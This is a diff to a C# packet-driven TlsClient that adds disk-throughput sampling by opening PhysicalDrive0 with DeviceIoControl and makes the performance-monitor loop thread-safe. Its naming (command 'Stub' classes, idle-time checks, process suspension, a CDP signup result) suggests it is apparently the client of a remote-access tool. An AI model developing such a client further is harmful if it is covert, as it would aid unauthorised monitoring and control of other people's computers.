@@ -641,15 +641,12 @@ internal class TlsClient : IDisposable
                 case PacketType.PerfMonStart:
                     var perfCfg = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.PerfMonStartStub);
                     _perfMonIntervalMs = perfCfg?.IntervalMs > 0 ? perfCfg.IntervalMs : 1000;
-                    if (!_perfMonRunning)
-                    {
-                        _perfMonRunning = true;
+                    if (System.Threading.Interlocked.CompareExchange(ref _perfMonRunning, 1, 0) == 0)
                         _ = PerfMonLoop(ct);
-                    }
                     break;
 
                 case PacketType.PerfMonStop:
-                    _perfMonRunning = false;
+                    System.Threading.Interlocked.Exchange(ref _perfMonRunning, 0);
                     break;
 
                 case PacketType.ProcSuspend:
@@ -983,6 +980,10 @@ internal class TlsClient : IDisposable
     private struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
     [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
     [System.Runtime.InteropServices.DllImport("kernel32.dll")] private static extern bool GetSystemTimes(out long idleTime, out long kernelTime, out long userTime);
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
+    private static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, IntPtr lpInBuffer, uint nInBufferSize, IntPtr lpOutBuffer, uint nOutBufferSize, out uint lpBytesReturned, IntPtr lpOverlapped);
 
     private long _lastIdle, _lastKernel, _lastUser;
     private float SampleCpu()
@@ -1069,6 +1070,13 @@ internal class TlsClient : IDisposable
 
     private long _lastNetSent, _lastNetRecv;
     private DateTime _lastNetTs = DateTime.UtcNow;
+    private long _lastDiskRead, _lastDiskWrite;
+    private DateTime _lastDiskTs = DateTime.UtcNow;
+    private static readonly IntPtr INVALID_HANDLE = new(-1);
+    private const uint GENERIC_READ = 0x80000000;
+    private const uint FILE_SHARE_RW = 3; // FILE_SHARE_READ | FILE_SHARE_WRITE
+    private const uint OPEN_EXISTING = 3;
+    private const uint IOCTL_DISK_PERFORMANCE = 0x00070020;
 
     private (long sentKBps, long recvKBps) SampleNetwork()
     {
@@ -1093,28 +1101,62 @@ internal class TlsClient : IDisposable
         catch { return (0, 0); }
     }
 
+    private (long readKBps, long writeKBps) SampleDisk()
+    {
+        try
+        {
+            var h = CreateFileW(@"\\.\PhysicalDrive0", GENERIC_READ, FILE_SHARE_RW, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
+            if (h == INVALID_HANDLE) return (0, 0);
+            try
+            {
+                const int bufSize = 96;
+                var buf = System.Runtime.InteropServices.Marshal.AllocHGlobal(bufSize);
+                try
+                {
+                    if (!DeviceIoControl(h, IOCTL_DISK_PERFORMANCE, IntPtr.Zero, 0, buf, bufSize, out _, IntPtr.Zero)) return (0, 0);
+                    long bytesRead    = System.Runtime.InteropServices.Marshal.ReadInt64(buf, 0);
+                    long bytesWritten = System.Runtime.InteropServices.Marshal.ReadInt64(buf, 8);
+                    var now = DateTime.UtcNow;
+                    double elapsed = (now - _lastDiskTs).TotalSeconds;
+                    long readKBps  = elapsed > 0 ? (long)((bytesRead    - _lastDiskRead)  / elapsed / 1024) : 0;
+                    long writeKBps = elapsed > 0 ? (long)((bytesWritten - _lastDiskWrite) / elapsed / 1024) : 0;
+                    _lastDiskRead = bytesRead; _lastDiskWrite = bytesWritten; _lastDiskTs = now;
+                    return (Math.Max(0, readKBps), Math.Max(0, writeKBps));
+                }
+                finally { System.Runtime.InteropServices.Marshal.FreeHGlobal(buf); }
+            }
+            finally { CloseHandle(h); }
+        }
+        catch { return (0, 0); }
+    }
+
     // ── PerfMon streaming ────────────────────────────────────────────────────
-    private volatile bool _perfMonRunning;
+    private volatile int _perfMonRunning;
     private int _perfMonIntervalMs = 1000;
 
     private async Task PerfMonLoop(CancellationToken ct)
     {
-        while (_perfMonRunning && !ct.IsCancellationRequested)
+        while (_perfMonRunning == 1 && !ct.IsCancellationRequested)
         {
             try
             {
                 await Task.Delay(_perfMonIntervalMs, ct);
-                if (!_perfMonRunning) break;
+                if (_perfMonRunning == 0) break;
                 var cpu = SampleCpu();
                 var hw  = SampleHardware(cpu);
-                var (sent, recv) = SampleNetwork();
+                var (sent, recv)   = SampleNetwork();
+                var (diskR, diskW) = SampleDisk();
                 var data = JsonSerializer.Serialize(new PerfMonDataStub
                 {
                     CpuUsage      = hw.CpuUsage,
                     RamUsed       = hw.RamUsed,
                     RamTotal      = hw.RamTotal,
                     NetworkSentKB = sent,
-                    NetworkRecvKB = recv
+                    NetworkRecvKB = recv,
+                    DiskReadKBps  = diskR,
+                    DiskWriteKBps = diskW,
+                    CpuName       = hw.CpuName,
+                    GpuName       = hw.GpuName,
                 }, SeroJson.Default.PerfMonDataStub);
                 await WritePacketAsync(new Packet { Type = PacketType.PerfMonData, Data = data }, CancellationToken.None);
             }
@@ -2419,7 +2461,7 @@ internal class CdpSignupResultStub  { public bool Success { get; set; } public s
 // ── Hardware Stats + PerfMon ─────────────────────────
 internal class HardwareStatsStub { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public string CpuName { get; set; } = ""; public string GpuName { get; set; } = ""; public int IdleSeconds { get; set; } }
 internal class PerfMonStartStub  { public int IntervalMs { get; set; } = 1000; }
-internal class PerfMonDataStub   { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public long NetworkSentKB { get; set; } public long NetworkRecvKB { get; set; } }
+internal class PerfMonDataStub   { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public long NetworkSentKB { get; set; } public long NetworkRecvKB { get; set; } public long DiskReadKBps { get; set; } public long DiskWriteKBps { get; set; } public string CpuName { get; set; } = ""; public string GpuName { get; set; } = ""; }
 
 // ── Process Manager extended ──────────────────────────
 internal class ProcSuspendResumeStub { public int Pid { get; set; } }
